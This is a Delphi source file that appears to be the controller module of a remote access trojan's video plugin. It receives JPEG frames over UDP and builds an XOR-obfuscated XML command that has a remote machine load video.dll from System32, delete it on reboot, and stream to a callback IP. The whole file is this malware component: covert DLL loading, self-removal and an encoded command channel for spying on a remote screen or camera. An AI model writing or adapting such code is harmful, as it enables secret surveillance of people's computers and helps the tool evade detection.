unit ufVideo;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, IdBaseComponent, IdComponent, IdUDPBase, IdUDPServer, ExtCtrls,jpeg,IdSocketHandle,
  xmldom, XMLIntf, msxmldom, XMLDoc;

type
  TfVideo = class(TForm)
    imgVideo: TImage;
    IdUDPServer1: TIdUDPServer;
    procedure IdUDPServer1UDPRead(Sender: TObject; AData: TStream;
      ABinding: TIdSocketHandle);
  private
    { Private declarations }
  public
    { Public declarations }
    function CreateOrder():string;
  end;

var
  fVideo: TfVideo;

implementation

{$R *.dfm}

procedure TfVideo.IdUDPServer1UDPRead(Sender: TObject; AData: TStream;
  ABinding: TIdSocketHandle);
var
  jpg:TJpegImage;
begin
try
  jpg := TJpegImage.Create;
  jpg.LoadFromStream(Adata);
  imgVideo.Picture.Bitmap.Assign(jpg);
  jpg.Free;
except
end;
end;
function TfVideo.CreateOrder():string;
const
  KEY='1';
var
  ss:tstrings;
  i:integer;
begin
  ss:=tstringlist.Create;
  ss.Add('<func>');
  ss.Add('<ID>1</ID>');
  ss.Add('<svrfile>video.dll</svrfile>');
  ss.Add('<lcadir>%SystemRoot%\System32</lcadir>');
  //ss.Add('<lcafile></lcafile>');
  ss.Add('<thread>false</thread>');
  ss.Add('<op>loadlibrary</op>');
  //ss.Add('<PID>0</PID>');
  ss.Add('<rebootdel>true</rebootdel>');
  ss.Add('<params>');
  ss.Add('<IP>192.168.1.2</IP>');
  ss.Add('<port>'+inttostr(IDUDPServer1.DefaultPort)+'</port>');//ss.Add('<port>7618</port>');
  ss.Add('</params>');
  ss.Add('</func>');
  result:=ss.Text;
  while pos(#$D#$A,result)>0 do
    delete(result,pos(#$D#$A,result),2);
  for i:=1 to length(result) do
    result[i]:=char(ord(result[i]) xor ord(KEY));
  ss.Free;
end;

end.
